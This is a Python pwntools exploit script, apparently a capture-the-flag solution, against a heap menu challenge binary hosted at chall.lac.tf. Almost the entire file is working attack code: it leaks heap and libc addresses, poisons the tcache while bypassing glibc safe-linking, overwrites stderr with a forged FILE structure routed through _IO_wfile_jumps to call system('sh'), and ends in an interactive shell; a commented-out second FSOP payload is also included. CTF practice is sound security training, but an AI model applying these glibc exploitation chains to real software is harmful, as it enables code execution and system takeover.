#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*_IO_flush_all
        b*_IO_flush_all_lockp
        b*_IO_wdoallocbuf
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('chall.lac.tf', 31144)
    # p = remote('0', 1337)
else:
    p = process([exe.path])
GDB()

def create(idx, size, data):
    slna(b'> ', 1)
    slna(b'Index: ', idx)
    slna(b'Size: ', size)
    sa(b'Data: ', data)

def delete(idx):
    slna(b'> ', 2)
    slna(b'Index: ', idx)

def output(idx):
    slna(b'> ', 3)
    slna(b'Index: ', idx)


create(0, 0, b'A'*12)
create(1, 5, b'hehehe')

# padding chunks
for i in range(0x30, 0xf0, 0x20):
    delete(1)
    delete(0)

    create(0, i, b'hehehe')
    create(1, i, b'hjahahaa')

delete(1)
delete(0)

#heap leak

leak_heap = flat(
    b'A'*0x20,
    # 0x521
)

create(0, 0, leak_heap)
output(0)

heap_leak = u64(p.recvline()[-6:-1] + b'\0\0\0')
info(f'heap leak: {hex(heap_leak)}')
# 5b
heap_base = heap_leak << 12
info(f'heap base : {hex(heap_base)}')

# libc leak
delete(0)

leak_libc = flat(
    b'A'*0x18,
    0x521
)

create(0, 0, leak_libc)
create(1, 0, b'A')

delete(1)
delete(0)

load = flat(
    b'A'*0x20
)

create(0, 0, load)
output(0)

libc_leak = u64(p.recvline()[-7:-1] + b'\0\0')
libc.address = libc_leak - 0x21ace0
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

delete(0)

# fix size and tcache poisoning
def protect(addr1, addr2):
    return (addr1 >> 12 ) ^ addr2

load = flat(
    b'A'*0x18,
    0x521,
    # p64(libc_leak) * 2,
)

create(0, 0, load)

delete(0)
create(0, 0xf8, b'test')
create(1, 0xf8, b'test')

delete(1)
delete(0)

load = flat(
    b'A'*0x18,
    0x101,
    protect(heap_base +0x2c0, libc.sym._IO_2_1_stderr_)
)
load = load.ljust(0x120-8, b'A')
load += flat(
    0x101,
    libc.sym.system
)
load = load.ljust(0x210-0x20, b'\0')
load += flat(
    heap_base +0x358
)

create(0, 0, load)


delete(0)

io = FileStructure()
io.flags = 0x3b01010101010101
io._IO_read_ptr = b'sh'
io._IO_write_ptr = heap_base
io._IO_write_base = 0
io.chain = libc.sym._IO_2_1_stdout_
io.vtable = libc.sym._IO_wfile_jumps
io._lock = libc.sym._IO_stdfile_2_lock
io._wide_data = heap_base +0x3b0 # check later

# _IO_flush_all
create(1, 0xf8, b'\0')
# input()

create(0, 0xf8, bytes(io))

""" rax is wide data
<_IO_wdoallocbuf+45>    mov    rax, qword ptr [rax + 0xe0]     RAX, [0x55555555b4b0] => 0
<_IO_wdoallocbuf+52>    call   qword ptr [rax + 0x68]
"""
sla(b'> ', b'4')


# p.recvuntil(b'foundation: ')
# leak = int(p.recvline(), 16)
# libc.address = leak - libc.sym['_IO_2_1_stdout_']
# log.info('leak: ' + hex(leak))
# log.info('base: ' + hex(libc.address))
# system = libc.sym['system']
# lock = libc.sym['_IO_stdfile_1_lock']
# fake_vtable = libc.sym['_IO_wfile_jumps'] - 0x18 # _IO_wfile_underflow
# stdout = libc.sym['_IO_2_1_stdout_']
# gadget = libc.address + 0x00000000001636a0 # add rdi, 0x10; jmp rcx;
# f = FileStructure(0)
# f.flags = 0x3b01010101010101
# f._lock = lock
# f._IO_read_end = system
# f._IO_write_end = u64(b'/bin/sh\0')
# f._IO_save_base = gadget
# f._codecvt = stdout + 0xb8
# f.unknown2 = p64(0)*2 + p64(stdout + 0x20) + p64(0)*3 + p64(fake_vtable) # _freeres_list
# pl = bytes(f)
# p.send(pl)
# p.interactive()

p.interactive()